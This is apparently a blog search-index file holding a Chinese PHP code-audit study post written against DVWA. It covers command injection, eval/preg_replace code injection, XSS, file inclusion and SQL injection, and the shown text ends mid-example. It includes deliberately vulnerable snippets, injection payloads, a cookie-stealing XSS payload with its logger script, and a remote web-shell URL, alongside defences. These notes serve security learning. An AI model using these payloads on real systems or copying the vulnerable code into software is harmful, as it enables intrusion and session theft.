<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>代码审计</title>
    <url>/2021/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="环境及工具"><a href="#环境及工具" class="headerlink" title="环境及工具"></a>环境及工具</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li><p>PHPStudy</p>
<ul>
<li>PHP 5.2.17nts</li>
</ul>
</li>
<li><p>DVWA</p>
</li>
</ul>
<p>搭建好DVWA后开始学习代码审计</p>
<h2 id="编写工具"><a href="#编写工具" class="headerlink" title="编写工具"></a>编写工具</h2><ul>
<li><p>NotePad++</p>
</li>
<li><p>PHPStorm</p>
</li>
</ul>
<h1 id="常用调试"><a href="#常用调试" class="headerlink" title="常用调试"></a>常用调试</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="string">"orange"</span>, <span class="string">"apple"</span>,<span class="string">"peach"</span>);</span><br><span class="line"><span class="comment">// 这是一个单行注释</span></span><br><span class="line"><span class="comment">// 这是一个单行注释</span></span><br><span class="line"><span class="comment">// 这是一个单行注释</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这个是多行注释</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这个是多行注释</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">这个是多行注释</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* exit 演示</span></span><br><span class="line"><span class="comment">echo $moon= "moon";</span></span><br><span class="line"><span class="comment">exit();</span></span><br><span class="line"><span class="comment">echo $sec="sec";</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//echo $moon;</span></span><br><span class="line"><span class="comment">//print $moon;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r ($a);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($a);</span></span><br><span class="line"><span class="comment">//var_dump($moon);</span></span><br><span class="line"><span class="comment">//debug_zval_dump($a);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//单引号跟双引号的区别</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//$str="moon";</span></span><br><span class="line"><span class="comment">////echo "$str";</span></span><br><span class="line"><span class="comment">//echo $str;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//var_dump($a);</span></span><br><span class="line"><span class="comment">//var_dump($str);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//echo $moon = "moon";</span></span><br><span class="line"><span class="comment">//exit();</span></span><br><span class="line"><span class="comment">//echo $sec="sec";</span></span><br><span class="line"></span><br><span class="line">$str=<span class="string">"moon"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$str"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$str'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="调试函数"><a href="#调试函数" class="headerlink" title="调试函数"></a>调试函数</h2><ul>
<li><p>echo</p>
<p>就是最简单的输出变量的方法</p>
</li>
<li><p>print_r</p>
<p>主要用于输出数组</p>
</li>
<li><p>var_dump</p>
<p>就是详细输出，包括变量的值以及变量的数据类型</p>
</li>
</ul>
<ul>
<li><p>var_export（不常用）</p>
<p>输出或返回一个变量的字符串表示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_export ( mixed $expression , bool $return = <span class="keyword">false</span> ) : mixed</span><br></pre></td></tr></table></figure>
<ul>
<li>参数 <ul>
<li>expression 想要输出的变量名。</li>
<li>return 此参数为 true 时，var_export() 将返回一个变量，而不是输出它</li>
</ul>
</li>
</ul>
</li>
<li><p>debug_zval_dump<br>转储内部zval结构的字符串表示形式以输出</p>
<p>官方解释是这样</p>
<p>没怎么看懂</p>
<p>直接看个官方例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var1 = <span class="string">'Hello'</span>;</span><br><span class="line">$var1 .= <span class="string">' World'</span>;</span><br><span class="line">$var2 = $var1;</span><br><span class="line"></span><br><span class="line">debug_zval_dump($var1);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>  输出<code>string(11) &quot;Hello World&quot; refcount(3)</code></p>
<p><del>感觉好像貌似</del>是输出变量的类型，长度，值和refcount（引用计数）</p>
<p><a href="https://blog.csdn.net/clh604/article/details/41850157" target="_blank" rel="noopener">参考文章</a></p>
<p><del>难怪不常用</del></p>
</li>
<li><p>exit</p>
<p>顾名思义 退出函数</p>
<p>可用于终止函数运行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $moon = <span class="string">"moon"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="keyword">echo</span> $sec=<span class="string">"sec"</span>;</span><br></pre></td></tr></table></figure>
<p>输出:<code>moon</code></p>
<p>如果没有exit()函数，则会输出<code>moonsec</code></p>
</li>
</ul>
<h2 id="单引号与双引号"><a href="#单引号与双引号" class="headerlink" title="单引号与双引号"></a>单引号与双引号</h2><p> <del>奇葩的PHP</del><br> <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str=<span class="string">"moon"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$str"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$str'</span>;</span><br></pre></td></tr></table></figure><br> 输出：<code>moon$str</code></p>
<p> <code>&quot;$变量&quot;</code>会正常执行  </p>
<p> 然而 <code>&#39;$变量&#39;</code>就会被当作字符串</p>
<h1 id="★超全局变量"><a href="#★超全局变量" class="headerlink" title="★超全局变量"></a>★超全局变量</h1><p>超全局变量是在全部作用域中<strong>始终可用</strong>的内置变量</p>
<p>超全局变量列表如下：</p>
<ul>
<li>$GLOBALS  ——  引用全局作用域中可用的全部变量</li>
<li>$_SERVER  ——  服务器和执行环境信息</li>
<li>$_REQUEST  ——  HTTP Request变量</li>
<li>$_POST  ——  HTTP POST变量</li>
<li>$_GET  ——  HTTP GET变量</li>
<li>$_FILES  ——  HTTP 文件上传变量</li>
<li>$_ENV  ——  环境变量</li>
<li>$_COOKIE  ——  HTTP Cookies</li>
<li>$_SESSION  ——  Session变量</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * $GLOBALS例子</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$moon=<span class="string">"1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $GLOBALS[<span class="string">'moon'</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $moon=<span class="string">"2"</span>;</span><br><span class="line">    <span class="keyword">echo</span> $GLOBALS[<span class="string">'moon'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$moon=<span class="string">"1"</span>;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 其他例子</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">print_r($_SERVER);  <span class="comment">//输出服务器和执行环境信息</span></span><br><span class="line">print_r($_GET);  <span class="comment">//输出所有GET方式的变量及其值</span></span><br><span class="line">print_r($_POST);  <span class="comment">//输出所有POST方式的变量及其值</span></span><br><span class="line">print_r($_FILES);  <span class="comment">//输出上传文件的变量及其值</span></span><br><span class="line">print_r($_COOKIE);  <span class="comment">//输出所有的cookie及其值</span></span><br><span class="line">print_r($_SESSION);  <span class="comment">//输出所有的session及其值</span></span><br><span class="line">print_r($_REQUEST);  <span class="comment">//输出cookie get post 等所有HTTP相关的变量及其值</span></span><br><span class="line">print_r($_ENV);  <span class="comment">//输出环境变量</span></span><br></pre></td></tr></table></figure>
<h1 id="★命令注入"><a href="#★命令注入" class="headerlink" title="★命令注入"></a>★命令注入</h1><h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><ul>
<li><p>system ( string $command [, int &amp;$return_var ] )</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=gbk2312'</span>);</span><br><span class="line">$action = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">system($action);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre/&gt;"</span>;</span><br></pre></td></tr></table></figure>
<p>浏览器访问url?cmd=ipconfig</p>
<p>就能打印出ipconfig信息到浏览器上</p>
</li>
<li><p>exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=gbk2312'</span>);</span><br><span class="line">$action = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> exec($action);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre/&gt;"</span>;</span><br></pre></td></tr></table></figure>
<p>也同样可以执行</p>
</li>
<li><p>passthru (string command, int &amp;return_var)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=gbk2312'</span>);</span><br><span class="line">$action = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> passthru($action);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre/&gt;"</span>;</span><br></pre></td></tr></table></figure>
<p>同样执行</p>
</li>
<li><p>shell_exec (string command)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=gbk2312'</span>);</span><br><span class="line">$action = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec($action);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre/&gt;"</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>反引号<code>`` </code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=gbk2312'</span>);</span><br><span class="line">$action = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> `$action`;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre/&gt;"</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>popen ( string $command , string $mode )</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=gbk2312'</span>);</span><br><span class="line">$action = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> popen($action,<span class="string">'r'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre/&gt;"</span>;</span><br></pre></td></tr></table></figure>
<p>该方法略有不同，本意是打开进程文件指针</p>
<p>参数：</p>
<ul>
<li>r: 只读</li>
<li>w: 只写 (打开并清空已有文件或创建一个新文件</li>
</ul>
<p>输出结果: <code>Resource id #2</code></p>
<p>可以通过这个结果来判断命令是否执行成功</p>
</li>
<li><p>proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )</p>
<p>一个php函数，执行一个命令，并且打开用来输入/输出的文件指针。 说白了就是可以操作执行服务器命令行</p>
<p>windows系统下不可用</p>
<p>执行结果类似</p>
</li>
<li><p>pcntl_exec ( string $path [, array $args [, array $envs ]] )<br>在当前进程空间执行指定程序</p>
<p>参数：</p>
<ul>
<li><p>path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。 更多的信息请查看您系统的execve（2）手册</p>
</li>
<li><p>args是一个要传递给程序的参数的字符串数组。 </p>
</li>
<li><p>envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值</p>
</li>
</ul>
</li>
</ul>
<h2 id="防御函数"><a href="#防御函数" class="headerlink" title="防御函数"></a>防御函数</h2><p>当用户提供的数据传入此函数，使用 <code>escapeshellarg()</code> 或 <code>escapeshellcmd()</code> 来确保用户欺骗系统从而执行任意命令。</p>
<ul>
<li><p>escapeshellarg ( string $arg ) </p>
<p>可以用到php的安全中，会过滤掉arg中存在的一些特殊字符。在输入的参数中如果包含中文传递给<br><code>escapeshellarg</code>，会被过滤掉。</p>
</li>
<li><p>escapeshellcmd ( string $command ) </p>
<p>escapeshellcmd()函数会转义命令中的所有shell元字符来完成工作。这些元字符包括：<code># &amp; ; ` , | * ? ~ &lt; &gt; ^ ( ) [ ] { } $ \\</code> </p>
</li>
</ul>
<h3 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h3><p>以<code>escapeshellcmd()</code>为例</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=gbk2312'</span>);</span><br><span class="line">$action=$_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec(escapeshellcmd($action));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre/&gt;"</span>;</span><br></pre></td></tr></table></figure>
<p>正常命令可以正常执行</p>
<p>但是如果有特殊字符则会被过滤，特殊字符不会生效</p>
<p><strong>如果不使用这个函数</strong></p>
<p>payload:<br><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> "aaaaa" &gt;&gt;<span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><br>则可本地生成一个1.txt的文档，文档内容是aaaaa</p>
<p>由此就可以通过写入一句话，来get shell</p>
<h1 id="代码执行注入"><a href="#代码执行注入" class="headerlink" title="代码执行注入"></a>代码执行注入</h1><h2 id="常见代码执行函数"><a href="#常见代码执行函数" class="headerlink" title="常见代码执行函数"></a>常见代码执行函数</h2><ul>
<li><p>eval</p>
<p>eval代码执行注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'moon'</span>]))&#123;</span><br><span class="line">    $moon=$_GET[<span class="string">'moon'</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"\$moon = $moon;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>url?moon=phpinfo()  就能看到php.ini的信息</p>
</li>
<li><p>assert</p>
<p>assert代码执行注入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'moon'</span>]))&#123;</span><br><span class="line">    $moon=$_GET[<span class="string">'moon'</span>];</span><br><span class="line">    assert(<span class="string">"\$moon = $moon;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>与eval基本类似</p>
</li>
</ul>
<ul>
<li><p>preg_replace<br>当pattern中存在/e模式修饰符，即允许执行代码。</p>
<ul>
<li><p>pattern在一个参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $regexp = $_GET[<span class="string">'reg'</span>];</span><br><span class="line">$var = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class="line">var_dump(preg_replace(<span class="string">"/&lt;php&gt;(.*?)$regexp"</span>, <span class="string">'\\1'</span>, $var));</span><br></pre></td></tr></table></figure>
<p>payload:<code>?reg=%3C\/php%3E/e</code></p>
</li>
<li><p>replacement 第二个参数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">"/moon/e"</span>,$_GET[<span class="string">'moon'</span>],<span class="string">"I love moon"</span>);</span><br></pre></td></tr></table></figure>
<p>payload<code>?moon=phpinfo()</code></p>
</li>
<li><p>preg_replace()第三个参数注射</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_replace(<span class="string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span>, <span class="string">"\\1"</span>, $_GET[<span class="string">'moon'</span>]);</span><br></pre></td></tr></table></figure>
<p>payload:<code>?moon=[php]phpinfo()[/php]</code></p>
</li>
</ul>
</li>
</ul>
<h1 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h1><h2 id="XSS反射型漏洞"><a href="#XSS反射型漏洞" class="headerlink" title="XSS反射型漏洞"></a>XSS反射型漏洞</h2><p>它通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行。</p>
<p>它的特点是非持久化，必须用户点击带有特定参数的链接才能引起。</p>
<h3 id="变量直接输出"><a href="#变量直接输出" class="headerlink" title="变量直接输出"></a>变量直接输出</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>];</span><br></pre></td></tr></table></figure>
<p>payload<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h3 id="SERVER变量参数"><a href="#SERVER变量参数" class="headerlink" title="$_SERVER变量参数"></a>$_SERVER变量参数</h3><ul>
<li><p>$_SERVER[‘PHP_SELF’] </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'PHP_SELF'</span>];</span><br></pre></td></tr></table></figure>
<p>payload<code>url/&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
</li>
<li><p>$_SERVER[‘HTTP_USER_AGENT’]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br></pre></td></tr></table></figure>
<p>输出浏览器版本</p>
<p>payload<code>user-agent添加xss</code></p>
</li>
<li><p>$_SERVER[‘HTTP_REFERER’] </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br></pre></td></tr></table></figure>
<p>payload:<code>修改Referer</code></p>
</li>
<li><p>$_SERVER[‘REQUEST_URI’]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urldecode($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br></pre></td></tr></table></figure>
<p>payload:<code>?&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
</li>
</ul>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>利用文件xss.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$cookie = $_GET[<span class="string">'c'</span>]; </span><br><span class="line">$ip = getenv (<span class="string">'REMOTE_ADDR'</span>); </span><br><span class="line">$time=date(<span class="string">"j F, Y, g:i a"</span>); </span><br><span class="line">$referer=getenv (<span class="string">'HTTP_REFERER'</span>); </span><br><span class="line">$fp = fopen(<span class="string">'cook.txt'</span>, <span class="string">'a'</span>); </span><br><span class="line">fwrite($fp, <span class="string">'Cookie: '</span>.$cookie.<span class="string">'&lt;br&gt; IP: '</span> .$ip. <span class="string">'&lt;br&gt; Date and Time: '</span>.$time. <span class="string">'&lt;br&gt; Referer: '</span>.$referer.<span class="string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span>); </span><br><span class="line">fclose </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>获取cookie的payload<code>&lt;script&gt;var i=new Image;i.src=&quot;http://127.0.0.1/xss.php?c=&quot;%2bdocument.cookie;&lt;/script&gt;</code></p>
<p><del>还可以用XSS平台 不介绍</del></p>
<h2 id="XSS存储型漏洞"><a href="#XSS存储型漏洞" class="headerlink" title="XSS存储型漏洞"></a>XSS存储型漏洞</h2><p>持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等。</p>
<p>审计sql语句<br>主要是update insert 更新和插入语句<br>内容输入输出没有被过滤或者过滤不严！</p>
<p>例子:</p>
<p>先创建个表<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE &#96;book&#96; (</span><br><span class="line">  &#96;id&#96; int(5) NOT NULL auto_increment,</span><br><span class="line">  &#96;title&#96; varchar(32) NOT NULL,</span><br><span class="line">  &#96;con&#96; text NOT NULL,</span><br><span class="line">  PRIMARY KEY  (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;MyISAM DEFAULT CHARSET&#x3D;gbk AUTO_INCREMENT&#x3D;1 ;</span><br></pre></td></tr></table></figure></p>
<p>留言板.php:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>);</span><br><span class="line">mysql_query(<span class="string">"set names gbk"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">$title=$_POST[<span class="string">'title'</span>];</span><br><span class="line">$con=$_POST[<span class="string">'con'</span>];</span><br><span class="line">$sql=<span class="string">"INSERT INTO `book` (`id` ,`title` ,`con`)VALUES (NULL , '$title', '$con');"</span>;</span><br><span class="line"><span class="keyword">if</span>(mysql_query($sql))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"留言成功"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"留言失败"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$sql=<span class="string">"select * from book"</span>;</span><br><span class="line"><span class="keyword">if</span>($row=mysql_query($sql))&#123;</span><br><span class="line"> <span class="keyword">while</span>($rows=mysql_fetch_array($row))&#123;</span><br><span class="line"> <span class="keyword">echo</span> $rows[<span class="string">'id'</span>].$rows[<span class="string">'title'</span>].$rows[<span class="string">'con'</span>].<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;暗月代码审计存储型xss漏洞演示&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">"?action=insert"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">标题：&lt;input type=<span class="string">"text"</span> name=<span class="string">"title"</span>&gt;&lt;br&gt;</span><br><span class="line">内容：&lt;textarea name=<span class="string">"con"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>存储型XSS会被存到数据库中，用户每次访问的时候都会被XSS，危害性极大</p>
<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p><code>htmlspecialchars</code>函数</p>
<p>预定义的字符:</p>
<ul>
<li>&amp; （和号） 成为 &amp;</li>
<li>“ （双引号） 成为 &quot;</li>
<li>‘ （单引号） 成为 &#039;</li>
<li>&lt; （小于） 成为 &lt;</li>
<li>> （大于） 成为 &gt;</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> htmlspecialchars ($rows[<span class="string">'id'</span>].$rows[<span class="string">'title'</span>].$rows[<span class="string">'con'</span>]).<span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure>
<h1 id="本地包含与远程包含"><a href="#本地包含与远程包含" class="headerlink" title="本地包含与远程包含"></a>本地包含与远程包含</h1><p>PHP有四个包含函数</p>
<ul>
<li><p>include</p>
</li>
<li><p>include_once</p>
</li>
<li><p>require</p>
</li>
<li><p>require_once</p>
</li>
</ul>
<p>include()：当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</p>
<p>include_once()：功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
<p>require()：1.require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。<br>2.使用require()函数包含文件时，只要程序一执行，立即调用文件，而include()只有程序执行到该函数时才调用。</p>
<p>require_once()：它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><p>受gpc影响</p>
<p>截断%00</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line"><span class="comment">//include $file.".php";</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>同目录下建一个test.txt<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure></p>
<p>payload:<code>?file=./test.txt</code></p>
<p>如果使用了<code>include $file.&quot;.php&quot;</code>拼接后缀名的这种方式，可以使用00截断</p>
<p>payload:<code>?file=./test.txt%00</code></p>
<h2 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h2><p>需要开启<code>allow_url_fopen</code>和<code>allow_url_include</code></p>
<p>可以使用伪协议</p>
<p>伪协议：<br><code>php://filter/read=convert.base64-encode/resource=</code></p>
<p>在allow_url_include = On 且 PHP &gt;= 5.2.0<br><code>php://input</code></p>
<p>或者直接包含网站中的木马<code>http://c99.in/c99.txt</code></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是<strong>SQL语法里的一些组合</strong>，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序<strong>没有细致地过滤用户输入的数据</strong>，致使非法数据侵入系统。</p>
<h2 id="审计语句"><a href="#审计语句" class="headerlink" title="审计语句"></a>审计语句</h2><ul>
<li><p>SELECT</p>
</li>
<li><p>DELETE</p>
</li>
<li><p>UPDATE</p>
</li>
<li><p>INSERT</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>);</span><br><span class="line">mysql_select_db(<span class="string">'test'</span>);</span><br><span class="line">mysql_query(<span class="string">"set names gbk"</span>);</span><br><span class="line"><span class="keyword">echo</span> $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">$sql=<span class="string">"select * from book where id='$id'"</span>;</span><br><span class="line"><span class="comment">//$sql="select * from book where id=$id";</span></span><br><span class="line"><span class="keyword">if</span>($row=mysql_query($sql))&#123;</span><br><span class="line">    $rows=mysql_fetch_array($row);</span><br><span class="line">    var_dump($rows);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 